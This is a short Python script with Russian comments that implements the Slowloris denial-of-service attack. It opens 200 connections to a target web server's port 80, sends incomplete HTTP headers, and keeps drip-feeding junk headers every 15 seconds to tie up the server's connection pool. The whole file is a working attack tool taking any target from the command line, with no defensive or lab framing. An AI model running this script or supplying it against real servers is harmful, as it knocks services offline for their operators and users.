#!/usr/bin/env python3
"""Slowloris — держит соединения открытыми, исчерпывает пул."""
import sys, socket, time, random, threading

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
CONNECTIONS = 200

sockets = []
lock = threading.Lock()

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((target, 80))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        return s
    except Exception:
        return None

def maintain():
    global sockets
    print(f"[slowloris] → {target} | {CONNECTIONS} соединений")
    # Открыть начальные соединения
    for _ in range(CONNECTIONS):
        s = create_socket()
        if s:
            with lock:
                sockets.append(s)
    print(f"[slowloris] Открыто {len(sockets)} соединений")
    while True:
        with lock:
            dead = []
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    dead.append(s)
            for s in dead:
                sockets.remove(s)
            # Восстановить мёртвые
            while len(sockets) < CONNECTIONS:
                ns = create_socket()
                if ns:
                    sockets.append(ns)
        time.sleep(15)

maintain()
